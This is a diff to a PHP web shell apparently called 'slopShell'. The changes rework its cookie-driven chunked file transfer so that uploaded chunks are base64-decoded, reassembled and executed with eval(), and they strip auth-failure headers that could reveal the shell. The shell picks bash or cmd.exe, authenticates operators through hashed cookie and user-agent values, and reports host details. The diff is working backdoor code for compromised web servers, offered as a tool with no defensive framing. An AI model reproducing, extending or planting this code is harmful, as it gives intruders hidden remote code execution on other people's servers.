@@ -18,7 +18,7 @@ if (function_exists("sodium_crypto_aead_chacha20poly1305_decrypt") && function_e
     }
 }
 
-if (!defined("os")) {
+if (!defined("slopos")) {
     define("slopos", strtoupper(substr(PHP_OS, 0, 3)));
 }
 $shell = (slopos === 'WIN') ? 'cmd.exe' : 'bash';
@@ -145,18 +145,33 @@ function banner()
     }
 }
 
-
 // removing b64, replacing with chunked file transfer.
-function chunkFileTransfer(string $fname, string $count, string $data){
-    if (defined("slopWindows")) {
-        $fp = fopen(sprintf("%s\\%s", scache, $fname), "a+");
-    }else{
-        $fp = fopen(sprintf("%s/%s", scache, $fname), "a+");
+function chunkFileTransfer($fname, $data, $count, $chunk): array
+{
+    $da = "";
+    $sum = md5($data);
+    $d = base64_decode($data);
+    if (slopos === "WIN"){
+        $g = sprintf("%s\\%s.dat", sys_get_temp_dir(), bin2hex(openssl_random_pseudo_bytes(10)));
+        if (!is_dir(sprintf("%s\\%s", sys_get_temp_dir(), $fname))){
+            mkdir(sprintf("%s\\%s", sys_get_temp_dir(), $fname));
+        }
+        file_put_contents($g, $d);
+    }else {
+        $g = sprintf("%s/%s", $fname, bin2hex(openssl_random_pseudo_bytes(10)));
+        file_put_contents(sprintf("%s/%s.%s", $fname, bin2hex(openssl_random_pseudo_bytes(10)), $count), $d);
     }
-    $chunk = base64_decode($data);
-    fwrite($fp, $chunk, strlen($chunk));
-    fclose($fp);
-    return $count;
+    if ($count === $chunk){
+        foreach (glob(sprintf("%s/*", $g), GLOB_MARK) as $ff){
+            if (!is_dir($ff)){
+                $da .= base64_decode(trim(file_get_contents($ff)));
+                unlink($ff);
+            }
+        }
+        unlink($g);
+        return ["checksum" => null, "d" => base64_encode(eval($da))];
+    }
+    return ["checksum" => base64_encode($sum), "d" => null];
 }
 
 function checkComs(): array
@@ -284,15 +299,11 @@ function remoteFileInclude($targetFile)
 function validate_auth($agent, $cookie_val, $uuid): bool
 {
     if (is_null($agent) || is_null($cookie_val) || is_null($uuid)) {
-        header(sprintf("Faliure: Auth did not work, all or one value was null - agent %s, cookie_val %s, uuid %s", is_null($agent), is_null($cookie_val), is_null($uuid)));
-        header(sprintf("FailReason: agent - %s, cookie_val - %s, uuid - %s", sha1($agent), sha1($cookie_val), sha1($uuid)));
         return false;
     }
     if (hash_equals(allow_agent, sha1($agent)) && hash_equals(cval, sha1($cookie_val)) && hash_equals(uuid, sha1($uuid))) {
-        header("Success: Auth worked!");
         return true;
     } else {
-        header(sprintf("GeneralFailure: Auth failed. agent - %s, cookie_val - %s, uuid - %s, expecting: %s %s %s", $agent, $cookie_val, $uuid, $agent, cval, uuid));
         return false;
     }
 }
@@ -366,17 +377,14 @@ function slopp()
         banner();
         switch (true) {
             case (isset($_COOKIE['cft'])):
-                $putdata = fopen("php://input", "r");
-                $cft = explode(".", base64_decode($_COOKIE['cftd']));
-                while ($data = fread($putdata, 1024)){
-                    chunkFileTransfer($cft[0], $cft[1], $data);
-                }
-                if (defined("slopWindows")){
-                    header(sprintf("MD5: %s", md5_file(sprintf("%s\\%s", scache, $cft[0]))));
+                $putData = $_COOKIE['token'];
+                $f = $_COOKIE['t'];
+                $a = chunkFileTransfer($f, $putData);
+                if (!is_null($a['checksum'])) {
+                    header(sprintf("MD5: %s", $a['checksum']));
                 }else{
-                    header(sprintf("MD5: %s", md5_file(sprintf("%s/%s", scache, $cft[0]))));
+                    header(sprintf("MD5: %s", $a['d']));
                 }
-                fclose($putdata);
                 break;
             case (isset($_COOKIE['qs'])):
                 $qs = [];
@@ -428,7 +436,8 @@ function slopp()
                     sprintf("slopShell: \033[0;32m%s\033[0m", sloppyshell),
                     sprintf("slopTor: %s", slopTor ? "\033[0;32mtrue\033[0m" : "\033[0;31mfalse\033[0m"),
                     sprintf("slopPGP: %s", slopPGP ? "\033[0;32mtrue\033[0m" : "\033[0;31mfalse\033[0m"),
-                    sprintf(".scache full path: %s", scache)
+                    sprintf(".scache full path: %s", scache),
+                    sprintf("Host PHP Version: %s", phpversion()),
                 ]);
                 $qs['configs'] = <<<INI
 Max file uploads: $fsize
